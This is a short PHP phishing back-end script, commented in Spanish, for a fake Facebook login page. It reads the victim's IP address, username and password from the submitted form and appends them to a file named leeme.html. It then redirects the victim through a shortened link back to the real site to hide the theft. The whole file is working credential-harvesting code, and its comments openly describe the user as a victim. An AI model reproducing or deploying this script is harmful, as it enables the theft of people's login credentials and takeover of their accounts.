<?
/*
Este archivo es el que procesa todos los datos de la victima y lo guarda en un 
archivo (leeme.html <- Aqui se guardaran los datos).
*/

#variable.php
// Asigna el valor a las variables del usuario y contraseña
$ip = strip_tags($_SERVER['REMOTE_ADDR']);
$usuario = $_POST['username'];
$contraseña = $_POST['password'];
//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
"<br/><b>ip:</b>".$ip.
"<br/><b>Usuario:</b>".$usuario.
"<br/><b>Contrasena:</b>".$contraseña." ");

fclose($guardame);
//Redirecciona a la web original (facebook)
echo "<meta http-equiv='refresh' content='1;url=https://tinyurl.com/2e65pz'>"
?>